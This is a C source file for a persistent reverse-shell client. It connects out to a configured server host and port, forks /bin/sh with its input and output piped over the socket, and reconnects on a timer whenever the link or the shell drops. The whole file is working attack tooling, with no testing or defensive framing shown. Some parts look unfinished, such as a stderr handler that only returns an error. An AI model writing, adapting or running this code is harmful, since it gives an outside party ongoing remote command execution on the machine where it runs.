#define _DEFAULT_SOURCE

#include <syslog.h>
#include <errno.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/signalfd.h>
#include <sys/timerfd.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <signal.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

#include "reverse.h"

#ifndef pidfd_open
int pidfd_open (
    pid_t pid,
    unsigned int flags
)
{
    return syscall(SYS_pidfd_open, pid, flags);
}
#endif


int reverse_shell (
    struct reverse_s * reverse
)
{
    int flags = 0;
    int ret = 0;

    // create pipes for stdin, stdout, stderr
    // reverse->stdin[0] contains the read-end of the pipe, reverse->stdin[1] contains the write-end.
    ret = pipe(reverse->stdin);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: pipe: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    ret = pipe(reverse->stdout);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: pipe: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    ret = pipe(reverse->stderr);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: pipe: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    // set out parts nonblocking
    flags = fcntl(reverse->stdin[1], F_GETFL, 0);
    if (-1 == flags) {
        syslog(LOG_ERR, "%s:%d:%s: fcntl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    ret = fcntl(reverse->stdin[1], F_SETFL, O_NONBLOCK | flags);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: fcntl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    flags = fcntl(reverse->stdout[0], F_GETFL, 0);
    if (-1 == flags) {
        syslog(LOG_ERR, "%s:%d:%s: fcntl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    ret = fcntl(reverse->stdout[0], F_SETFL, O_NONBLOCK | flags);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: fcntl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    flags = fcntl(reverse->stderr[0], F_GETFL, 0);
    if (-1 == flags) {
        syslog(LOG_ERR, "%s:%d:%s: fcntl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    ret = fcntl(reverse->stderr[0], F_SETFL, O_NONBLOCK | flags);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: fcntl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    // Add process stdout, stderr to epoll
    ret = epoll_ctl(
        reverse->epollfd,
        EPOLL_CTL_ADD,
        reverse->stdout[0],
        &(struct epoll_event){
            .events = EPOLLIN | EPOLLONESHOT,
            .data = {
                .fd = reverse->stdout[0]
            }
        }
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    ret = epoll_ctl(
        reverse->epollfd,
        EPOLL_CTL_ADD,
        reverse->stderr[0],
        &(struct epoll_event){
            .events = EPOLLIN | EPOLLONESHOT,
            .data = {
                .fd = reverse->stdout[0]
            }
        }
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }
    

    switch (reverse->shell_pid = fork()) {
        case -1:
            syslog(LOG_ERR, "%s:%d:%s: fork: %s", __FILE__, __LINE__, __func__, strerror(errno));
            return -1;
            break;

        case 0:
            // move stdin, stdout, stderr pipes to 0, 1, 2
            ret = dup2(reverse->stdin[0], STDIN_FILENO);
            if (-1 == ret) {
                syslog(LOG_ERR, "%s:%d:%s: dup2: %s", __FILE__, __LINE__, __func__, strerror(errno));
                return -1;
            }

            ret = dup2(reverse->stdout[1], STDOUT_FILENO);
            if (-1 == ret) {
                syslog(LOG_ERR, "%s:%d:%s: dup2: %s", __FILE__, __LINE__, __func__, strerror(errno));
                return -1;
            }

            ret = dup2(reverse->stderr[1], STDERR_FILENO);
            if (-1 == ret) {
                syslog(LOG_ERR, "%s:%d:%s: dup2: %s", __FILE__, __LINE__, __func__, strerror(errno));
                return -1;
            }

            // unblock signals
            ret = sigprocmask(
                /* how = */ SIG_UNBLOCK,
                /* set = */ &reverse->sigset, 
                /* old = */ NULL
            );
            if (-1 == ret) {
                syslog(LOG_ERR, "%s:%d:%s: sigprocmask: %s", __FILE__, __LINE__, __func__, strerror(errno));
                return -1;
            }

            // exec shell
            execl("/bin/sh", "/bin/sh", (const char * const)0);

            syslog(LOG_ERR, "%s:%d:%s: execl /bin/sh: %s", __FILE__, __LINE__, __func__, strerror(errno));
            exit(EXIT_FAILURE);
            break;

        default:
            reverse->pidfd = pidfd_open(reverse->shell_pid, O_NONBLOCK);
            ret = epoll_ctl(
                reverse->epollfd,
                EPOLL_CTL_ADD,
                reverse->pidfd,
                &(struct epoll_event){
                    .events = EPOLLIN | EPOLLONESHOT,
                    .data = {
                        .fd = reverse->pidfd
                    }
                }
            );
            if (-1 == ret) {
                syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
                return -1;
            }
    }

    return 0;
}


int reverse_connect (
    struct reverse_s * reverse
)
{

    int ret = 0;

    if (NULL == reverse->server.addrinfo_p) {
        syslog(LOG_ERR, "%s:%d:%s: could not connect, trying again later...", __FILE__, __LINE__, __func__);
        freeaddrinfo(reverse->server.addrinfo);
        reverse->server.addrinfo = NULL;
        reverse->server.addrinfo_p = NULL;
        reverse->server.fd = 0;

        // arm timerfd
        ret = timerfd_settime(
            /* fd        = */ reverse->connecttimerfd,
            /* opt       = */ 0,
            /* timerspec = */ &(struct itimerspec) {
                .it_interval = {0},
                .it_value = {
                    .tv_sec  = 2,
                    .tv_nsec = 0
                }
            },
            /* old_ts    = */ NULL
        );
        if (-1 == ret) {
            syslog(LOG_ERR, "%s:%d:%s: timerfd_settime: %s", __FILE__, __LINE__, __func__, strerror(errno));
            return -1;
        }

        return 0;
    }

    reverse->server.fd = socket(
        reverse->server.addrinfo_p->ai_family,
        reverse->server.addrinfo_p->ai_socktype | SOCK_NONBLOCK,
        reverse->server.addrinfo_p->ai_protocol
    );
    if (-1 == reverse->server.fd) {
        syslog(LOG_WARNING, "%s:%d:%s: socket: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    ret = connect(
        reverse->server.fd,
        reverse->server.addrinfo_p->ai_addr,
        reverse->server.addrinfo_p->ai_addrlen
    );
    if (-1 == ret && errno != EINPROGRESS) {
        syslog(LOG_WARNING, "%s:%d:%s: connect: %s", __FILE__, __LINE__, __func__, strerror(errno));
        close(reverse->server.fd);
        reverse->server.fd = 0;
        reverse->server.addrinfo_p = reverse->server.addrinfo_p->ai_next;
        return reverse_connect(reverse);
    }
    if (-1 == ret && EINPROGRESS == errno) {
       // connection in progress, wait for completion 
       ret = epoll_ctl(
           reverse->epollfd,
           EPOLL_CTL_ADD,
           reverse->server.fd,
           &(struct epoll_event){
               .events = EPOLLOUT | EPOLLIN | EPOLLONESHOT,
               .data = {
                   .fd = reverse->server.fd
               }
           }
       );
       if (-1 == ret) {
           syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
           return -1;
       }
       
       return 0;
    }


    // We successfully connected; clear out addrinfo structs and add fork-exec out the shell
    freeaddrinfo(reverse->server.addrinfo);
    reverse->server.addrinfo = NULL;
    reverse->server.addrinfo_p = NULL;

    ret = reverse_shell(reverse);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: reverse_shell returned -1", __FILE__, __LINE__, __func__);
        return -1;
    }

    return 0;
}


int reverse_init (
    struct reverse_s * reverse
)
{

    int ret = 0;

    // create epoll
    reverse->epollfd = epoll_create1(EPOLL_CLOEXEC);
    if (-1 == reverse->epollfd) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_create1: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    ret = sigemptyset(&reverse->sigset);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: sigemptyset: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    ret = sigaddset(&reverse->sigset, SIGPIPE);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: sigaddset: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    ret = sigaddset(&reverse->sigset, SIGINT);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: sigaddset: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    ret = sigaddset(&reverse->sigset, SIGCHLD);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: sigaddset: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    ret = sigprocmask(
        /* how = */ SIG_BLOCK,
        /* set = */ &reverse->sigset, 
        /* old = */ NULL
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: sigprocmask: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }
    
    // create signalfd
    reverse->signalfd = signalfd(
        /* fd = */ -1,
        /* &sigset = */ &reverse->sigset,
        /* flags = */ SFD_CLOEXEC | SFD_NONBLOCK
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: signalfd: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    // add signalfd to epoll
    ret = epoll_ctl(
        reverse->epollfd,
        EPOLL_CTL_ADD,
        reverse->signalfd,
        &(struct epoll_event){
            .events = EPOLLIN | EPOLLONESHOT,
            .data = {
                .fd = reverse->signalfd
            }
        }
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    // add timerfd for connection attempt signaling
    reverse->connecttimerfd = timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC);
    if (-1 == reverse->connecttimerfd) {
        syslog(LOG_ERR, "%s:%d:%s: timerfd_create: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    // add timerfd to epoll
    ret = epoll_ctl(
        reverse->epollfd,
        EPOLL_CTL_ADD,
        reverse->connecttimerfd,
        &(struct epoll_event){
            .events = EPOLLIN | EPOLLONESHOT,
            .data = {
                .fd = reverse->connecttimerfd
            }
        }
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    // set timerfd so we attempt to connect immediately
    // arm timerfd
    ret = timerfd_settime(
        /* fd        = */ reverse->connecttimerfd,
        /* opt       = */ 0,
        /* timerspec = */ &(struct itimerspec) {
            .it_interval = {0},
            .it_value = {
                .tv_sec  = 0,
                .tv_nsec = 1
            }
        },
        /* old_ts    = */ NULL
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: timerfd_settime: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    // add shell timerfd
    reverse->shelltimerfd = timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC);
    if (-1 == reverse->shelltimerfd) {
        syslog(LOG_ERR, "%s:%d:%s: timerfd_create: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    // add timerfd to epoll
    ret = epoll_ctl(
        reverse->epollfd,
        EPOLL_CTL_ADD,
        reverse->shelltimerfd,
        &(struct epoll_event){
            .events = EPOLLIN | EPOLLONESHOT,
            .data = {
                .fd = reverse->shelltimerfd
            }
        }
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    // add watchdog timerfd
    reverse->watchdogfd = timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC);
    if (-1 == reverse->watchdogfd) {
        syslog(LOG_ERR, "%s:%d:%s: timerfd_create: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    // add timerfd to epoll
    ret = epoll_ctl(
        reverse->epollfd,
        EPOLL_CTL_ADD,
        reverse->watchdogfd,
        &(struct epoll_event){
            .events = EPOLLIN | EPOLLONESHOT,
            .data = {
                .fd = reverse->watchdogfd
            }
        }
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    return 0;
}


int reverse_epoll_event_signalfd_sigchld (
    struct reverse_s * reverse,
    struct epoll_event * event,
    struct signalfd_siginfo * siginfo
)
{

    int ret = 0;

    if (siginfo->ssi_pid == reverse->shell_pid) {
        // we caught a SIGCHLD of our shell, but we have a pidfd handling that
        // one, so it's fine, just exit out.
        return 0;
    }

    syslog(LOG_ERR, "%s:%d:%s: caught unhandled SIGCHLD", __FILE__, __LINE__, __func__);
    return -1;
}


static int reverse_epoll_event_signalfd (
    struct reverse_s * reverse,
    struct epoll_event * event
)
{
    int bytes_read = 0;
    struct signalfd_siginfo siginfo = {0};

    bytes_read = read(event->data.fd, &siginfo, sizeof(siginfo));
    if (-1 == bytes_read) {
        syslog(LOG_ERR, "%s:%d:%s: read: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }
    if (0 == bytes_read) {
        syslog(LOG_ERR, "%s:%d:%s: read 0 bytes (fd closed?)", __FILE__, __LINE__, __func__);
        return -1;
    }
    if (sizeof(siginfo) != bytes_read) {
        syslog(LOG_ERR, "%s:%d:%s: partial read", __FILE__, __LINE__, __func__);
        return -1;
    }

    if (SIGCHLD == siginfo.ssi_signo)
        return reverse_epoll_event_signalfd_sigchld(reverse, event, &siginfo);

    syslog(LOG_ERR, "%s:%d:%s: caught unhandled signal %d", __FILE__, __LINE__, __func__, siginfo.ssi_signo);
    return -1;
}


static int reverse_epoll_event_watchdogfd (
    struct reverse_s * reverse,
    struct epoll_event * event
)
{
    syslog(LOG_ERR, "%s:%d:%s: NO", __FILE__, __LINE__, __func__);
    return -1;
}


static int reverse_epoll_event_connecttimerfd (
    struct reverse_s * reverse,
    struct epoll_event * event
)
{
    int ret = 0;
    int bytes_read = 0;
    uint64_t expirations = 0;

    bytes_read = read(event->data.fd, &expirations, sizeof(expirations));
    if (-1 == bytes_read) {
        syslog(LOG_ERR, "%s:%d:%s: read: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }
    if (0 == bytes_read) {
        syslog(LOG_ERR, "%s:%d:%s: read 0 bytes (fd closed?)", __FILE__, __LINE__, __func__);
        return -1;
    }

    // check if we're already trying to connect first
    if (NULL != reverse->server.addrinfo) {
        syslog(LOG_WARNING, "%s:%d:%s: got a timerfd expiration, but we're already trying to connect...", __FILE__, __LINE__, __func__);
        ret = epoll_ctl(
            reverse->epollfd,
            EPOLL_CTL_MOD,
            event->data.fd,
            &(struct epoll_event){
                .events = EPOLLIN | EPOLLONESHOT,
                .data = event->data
            }
        );
        if (-1 == ret) {
            syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
            return -1;
        }
        return 0;
    }

    ret = getaddrinfo(
        /* host = */ CONFIG_SERVER_HOST,
        /* port = */ CONFIG_SERVER_PORT,
        /* hints = */ &(struct addrinfo) {
            .ai_family = AF_UNSPEC,
            .ai_socktype = SOCK_STREAM,
            .ai_flags = AI_PASSIVE
        },
        /* servinfo = */ &reverse->server.addrinfo
    );
    if (-1 == ret) {
        syslog(LOG_WARNING, "%s:%d:%s: getaddrinfo: %s", __FILE__, __LINE__, __func__, gai_strerror(ret));
        return -1;
    }
    if (NULL == reverse->server.addrinfo) {
        syslog(LOG_WARNING, "%s:%d:%s: no results from getaddrinfo", __FILE__, __LINE__, __func__);
        return -1;
    }

    reverse->server.addrinfo_p = reverse->server.addrinfo;

    // since we're going to try connecting now, let's re-arm the fd on epoll first.
    ret = epoll_ctl(
        reverse->epollfd,
        EPOLL_CTL_MOD,
        event->data.fd,
        &(struct epoll_event){
            .events = EPOLLIN | EPOLLONESHOT,
            .data = event->data
        }
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    return reverse_connect(reverse);
}


int reverse_epoll_event_serverfd_connected (
    struct reverse_s * reverse,
    struct epoll_event * event
)
{
    int ret = 0;
    uint8_t buf[2048];
    int bytes_read = 0;
    int bytes_written = 0;

    syslog(LOG_DEBUG, "%s:%d:%s: hi!", __FILE__, __LINE__, __func__);

    bytes_read = read(event->data.fd, buf, sizeof(buf));
    if (-1 == bytes_read) {
        syslog(LOG_ERR, "%s:%d:%s: read: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }
    if (0 == bytes_read) {
        // when server closes connection, we kill the shell and retry
        ret = kill(reverse->shell_pid, SIGKILL);
        if (-1 == ret) {
            syslog(LOG_ERR, "%s:%d:%s: kill: %s", __FILE__, __LINE__, __func__, strerror(errno));
            return -1;
        }

        // arm timerfd
        ret = timerfd_settime(
            /* fd        = */ reverse->connecttimerfd,
            /* opt       = */ 0,
            /* timerspec = */ &(struct itimerspec) {
                .it_interval = {0},
                .it_value = {
                    .tv_sec  = CONFIG_RETRY_INTERVAL_SECONDS,
                    .tv_nsec = 0
                }
            },
            /* old_ts    = */ NULL
        );
        if (-1 == ret) {
            syslog(LOG_ERR, "%s:%d:%s: timerfd_settime: %s", __FILE__, __LINE__, __func__, strerror(errno));
            return -1;
        }

        return 0;
    }

    // forward the data to the process
    bytes_written = write(reverse->stdin[1], buf, bytes_read);
    if (-1 == bytes_written) {
        syslog(LOG_ERR, "%s:%d:%s: write: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }
    if (0 == bytes_written) {
        syslog(LOG_ERR, "%s:%d:%s: write 0 bytes (fd closed?)", __FILE__, __LINE__, __func__);
        return -1;
    }
    if (bytes_read != bytes_written) {
        syslog(LOG_ERR, "%s:%d:%s: partial write", __FILE__, __LINE__, __func__);
        return -1;
    }

    // re-arm fd on epoll
    ret = epoll_ctl(
        reverse->epollfd,
        EPOLL_CTL_MOD,
        event->data.fd,
        &(struct epoll_event){
            .events = EPOLLIN | EPOLLONESHOT,
            .data = event->data
        }
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    return 0;
}


int reverse_epoll_event_serverfd_connecting (
    struct reverse_s * reverse,
    struct epoll_event * event
)
{
    int ret = 0;
    int sockerr = 0;

    // Use getsockopt() to check if we've successfully connected.
    ret = getsockopt(
        /* fd = */ event->data.fd,
        /* level = */ SOL_SOCKET,
        /* option = */ SO_ERROR,
        /* ret = */ &sockerr,
        /* ret_len = */ &(socklen_t){sizeof(sockerr)}
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: getsockopt: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }
    if (sockerr != 0) {
        syslog(LOG_WARNING, "%s:%d:%s: connect: %s", __FILE__, __LINE__, __func__, strerror(sockerr));
        reverse->server.addrinfo_p = reverse->server.addrinfo_p->ai_next;
        return reverse_connect(reverse);
    }

    // we've successfully connected. free the structures and fork-exec out the shell.
    freeaddrinfo(reverse->server.addrinfo);
    reverse->server.addrinfo = NULL;
    reverse->server.addrinfo_p = NULL;

    ret = reverse_shell(reverse);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: reverse_shell returned -1", __FILE__, __LINE__, __func__);
        return -1;
    }

    // re-arm the fd on epoll
    ret = epoll_ctl(
        reverse->epollfd,
        EPOLL_CTL_MOD,
        event->data.fd,
        &(struct epoll_event){
            .events = EPOLLIN | EPOLLONESHOT,
            .data = event->data
        }
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    return 0;
}


static int reverse_epoll_event_serverfd (
    struct reverse_s * reverse,
    struct epoll_event * event
)
{
    if (NULL == reverse->server.addrinfo)
        return reverse_epoll_event_serverfd_connected(reverse, event);

    if (NULL != reverse->server.addrinfo)
        return reverse_epoll_event_serverfd_connecting(reverse, event);

    return 0;
}


int reverse_epoll_event_pidfd (
    struct reverse_s * reverse,
    struct epoll_event * event
)
{

    int ret = 0;

    syslog(LOG_DEBUG, "%s:%d:%s: hi!", __FILE__, __LINE__, __func__);

    // child died; reap it and start timer to try again.
    // Remember to EPOLL_CTL_DEL *before* closing the file descriptor, see
    // https://idea.popcount.org/2017-03-20-epoll-is-fundamentally-broken-22/
    ret = epoll_ctl(
        reverse->epollfd,
        EPOLL_CTL_DEL,
        event->data.fd,
        NULL
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    close(reverse->pidfd);
    reverse->pidfd = 0;

    // kick shell timerfd so we start the shell again soon
    // arm timerfd
    ret = timerfd_settime(
        /* fd        = */ reverse->shelltimerfd,
        /* opt       = */ 0,
        /* timerspec = */ &(struct itimerspec) {
            .it_interval = {0},
            .it_value = {
                .tv_sec  = 1,
                .tv_nsec = 0
            }
        },
        /* old_ts    = */ NULL
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: timerfd_settime: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    return 0;
}


int reverse_epoll_event_shelltimerfd (
    struct reverse_s * reverse,
    struct epoll_event * event
)
{
    int ret = 0;
    uint64_t expirations = 0;
    int bytes_read = 0;

    bytes_read = read(event->data.fd, &expirations, sizeof(expirations));
    if (-1 == bytes_read) {
        syslog(LOG_ERR, "%s:%d:%s: read: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }
    if (0 == bytes_read) {
        syslog(LOG_ERR, "%s:%d:%s: read 0 bytes (fd closed?)", __FILE__, __LINE__, __func__);
        return -1;
    }
    
    ret = reverse_shell(reverse);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: reverse_shell returned -1", __FILE__, __LINE__, __func__);
        return -1;
    }

    // re-arm the fd on epoll
    ret = epoll_ctl(
        reverse->epollfd,
        EPOLL_CTL_MOD,
        event->data.fd,
        &(struct epoll_event){
            .events = EPOLLIN | EPOLLONESHOT,
            .data = event->data
        }
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    return 0;
}


int reverse_epoll_event_stdout (
    struct reverse_s * reverse,
    struct epoll_event * event
)
{
    // received data from process stdout, forward it to the server.
    int ret = 0;
    int bytes_read = 0;
    int bytes_written = 0;
    uint8_t buf[2048];

    syslog(LOG_DEBUG, "%s:%d:%s: hi!", __FILE__, __LINE__, __func__);

    bytes_read = read(event->data.fd, buf, sizeof(buf));
    if (-1 == bytes_read) {
        // just close everything and try again later
        ret = kill(reverse->shell_pid, SIGKILL);
        if (-1 == ret) {
            syslog(LOG_ERR, "%s:%d:%s: kill: %s", __FILE__, __LINE__, __func__, strerror(errno));
            return -1;
        }

        ret = epoll_ctl(
            reverse->epollfd,
            EPOLL_CTL_DEL,
            reverse->stdout[0],
            NULL
        );
        if (-1 == ret) {
            syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
            return -1;
        }
        ret = epoll_ctl(
            reverse->epollfd,
            EPOLL_CTL_DEL,
            reverse->stderr[0],
            NULL
        );
        if (-1 == ret) {
            syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
            return -1;
        }
        ret = epoll_ctl(
            reverse->epollfd,
            EPOLL_CTL_DEL,
            reverse->server.fd,
            NULL
        );
        if (-1 == ret) {
            syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
            return -1;
        }
        close(reverse->stdin[1]);
        close(reverse->stdout[0]);
        close(reverse->stderr[0]);
        close(reverse->server.fd);

        reverse->stdin[1] = 0;
        reverse->stdout[0] = 0;
        reverse->stderr[0] = 0;
        reverse->server.fd = 0;

        // arm timerfd
        ret = timerfd_settime(
            /* fd        = */ reverse->connecttimerfd,
            /* opt       = */ 0,
            /* timerspec = */ &(struct itimerspec) {
                .it_interval = {0},
                .it_value = {
                    .tv_sec  = CONFIG_RETRY_INTERVAL_SECONDS,
                    .tv_nsec = 0
                }
            },
            /* old_ts    = */ NULL
        );
        if (-1 == ret) {
            syslog(LOG_ERR, "%s:%d:%s: timerfd_settime: %s", __FILE__, __LINE__, __func__, strerror(errno));
            return -1;
        }
        
        return 0;
    }
    if (0 == bytes_read) {
        syslog(LOG_ERR, "%s:%d:%s: read 0 bytes (fd closed?)", __FILE__, __LINE__, __func__);
        return -1;
    }

    bytes_written = write(reverse->server.fd, buf, bytes_read);
    if (-1 == bytes_written) {
        syslog(LOG_ERR, "%s:%d:%s: write: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }
    if (0 == bytes_written) {
        syslog(LOG_ERR, "%s:%d:%s: wrote 0 bytes (fd closed?)", __FILE__, __LINE__, __func__);
        return -1;
    }
    if (bytes_written != bytes_read) {
        syslog(LOG_ERR, "%s:%d:%s: partial write", __FILE__, __LINE__, __func__);
        return -1;
    }

    // re-arm fd on epoll
    ret = epoll_ctl(
        reverse->epollfd,
        EPOLL_CTL_MOD,
        event->data.fd,
        &(struct epoll_event){
            .events = EPOLLIN | EPOLLONESHOT,
            .data = event->data
        }
    );
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: epoll_ctl: %s", __FILE__, __LINE__, __func__, strerror(errno));
        return -1;
    }

    return 0;
}


int reverse_epoll_event_stderr (
    struct reverse_s * reverse,
    struct epoll_event * event
)
{

    int ret = 0;

    syslog(LOG_DEBUG, "%s:%d:%s: hi!", __FILE__, __LINE__, __func__);
    return -1;

    return 0;
}


static int reverse_epoll_event_dispatch (
    struct reverse_s * reverse,
    struct epoll_event * event
)
{
    if (event->data.fd == reverse->signalfd)
        return reverse_epoll_event_signalfd(reverse, event);

    if (event->data.fd == reverse->watchdogfd)
        return reverse_epoll_event_watchdogfd(reverse, event);

    if (event->data.fd == reverse->connecttimerfd)
        return reverse_epoll_event_connecttimerfd(reverse, event);

    if (event->data.fd == reverse->server.fd)
        return reverse_epoll_event_serverfd(reverse, event);

    if (event->data.fd == reverse->shelltimerfd)
        return reverse_epoll_event_shelltimerfd(reverse, event);

    if (event->data.fd == reverse->pidfd)
        return reverse_epoll_event_pidfd(reverse, event);

    if (event->data.fd == reverse->stdout[0])
        return reverse_epoll_event_stdout(reverse, event);

    if (event->data.fd == reverse->stderr[0])
        return reverse_epoll_event_stderr(reverse, event);

    syslog(LOG_ERR, "%s:%d:%s: No match on epoll event.", __FILE__, __LINE__, __func__);
    return -1;
}


static int reverse_epoll_handle_events (
    struct reverse_s * reverse,
    struct epoll_event epoll_events[8],
    int epoll_events_len
)
{
    int ret = 0;
    for (int i = 0; i < epoll_events_len; i++) {
        ret = reverse_epoll_event_dispatch(reverse, &epoll_events[i]);
        if (0 != ret) {
            return ret;
        }
    }
    return 0;
}


int reverse_loop (
    struct reverse_s * reverse
)
{

    int ret = 0;

    int epoll_events_len = 0;
    struct epoll_event epoll_events[8];
    while (1) {
        epoll_events_len = epoll_wait(
            /* epollfd = */ reverse->epollfd,
            /* &events = */ epoll_events,
            /* events_len = */ 8,
            /* timeout = */ -1
        );

        // got interrupted, just try again.
        if (-1 == epoll_events_len && EINTR == errno) {
            continue;
        }

        if (-1 == epoll_events_len) {
            syslog(LOG_ERR, "%s:%d:%s: epoll_wait: %s", __FILE__, __LINE__, __func__, strerror(errno));
            return -1;
        }

        if (0 == epoll_events_len) {
            syslog(LOG_ERR, "%s:%d:%s: epoll_wait returned 0 events", __FILE__, __LINE__, __func__);
            return -1;
        }

        // dispatch on event
        ret = reverse_epoll_handle_events(reverse, epoll_events, epoll_events_len);
        if (-1 == ret) {
            syslog(LOG_ERR, "%s:%d:%s: reverse_epoll_handle_events returned -1", __FILE__, __LINE__, __func__);
            return -1;
        }
    }

    return 0;
}


int main (
    int argc,
    char const* argv[]
)
{
    int ret = 0;
    openlog("reverse", LOG_CONS | LOG_PID, LOG_USER);
    struct reverse_s reverse = {0};

    ret = reverse_init(&reverse);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: reverse_init returned -1", __FILE__, __LINE__, __func__);
        return -1;
    }

    ret = reverse_loop(&reverse);
    if (-1 == ret) {
        syslog(LOG_ERR, "%s:%d:%s: reverse_loop returned -1", __FILE__, __LINE__, __func__);
        return -1;
    }

    return 0;
}
